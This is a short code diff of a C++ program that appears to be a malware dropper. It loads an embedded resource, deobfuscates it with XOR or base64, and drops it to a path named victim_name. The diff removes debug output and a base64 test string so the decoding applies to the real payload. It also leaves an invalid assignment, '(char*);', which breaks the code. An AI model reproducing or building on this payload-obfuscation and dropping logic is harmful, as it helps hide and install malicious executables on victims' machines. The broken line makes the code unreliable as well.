@@ -50,7 +50,7 @@ void set_name();
 char name[10 * NAME_SIZE];
 
 // (char*) C:\\example\\path\\to\\your\\payload.exe
-char* victim_name = (char*)"C:\\Users\\adind\\source\\repos\\CppTest\\calc.exe";
+char* victim_name = (char*);
 
 int xor_key = 115;
 
@@ -70,16 +70,11 @@ int main(int argc, char* argv[])
 	DWORD size = SizeofResource(h, r);
 	// Obfuscation Procedures start here
 #ifdef XOR_ENCODE
-	std::cout << "xor was executed in c++.\n";
 	data = XOR(data, size);
 #endif
 
 #ifdef BASE64
-	std::cout << "base 64 was executed in c++.\n";
-	void* data1 = "SGVsbG8gV29ybGQ=";
-	data = base64decode(data1, &size);
-	char* msg = (char*)data;
-	std::cout << "Given the input is Hello World the base64 is: " << msg << std::endl;
+	data = base64decode(data, &size);
 #endif
 	// where to drop
 	set_name();
